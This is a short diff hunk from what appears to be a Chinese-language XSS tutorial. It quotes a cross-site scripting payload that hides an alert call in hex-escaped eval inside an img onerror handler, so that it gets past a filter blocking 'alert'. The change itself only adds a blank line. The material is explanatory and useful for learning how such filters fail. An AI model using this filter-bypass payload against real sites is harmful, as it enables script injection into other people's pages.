@@ -160,3 +160,4 @@ xss几乎每个网站都存在，google、baidu、360等都存在。
 <-- 过滤了alert来执行弹窗 -->
 <img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
 ```
+
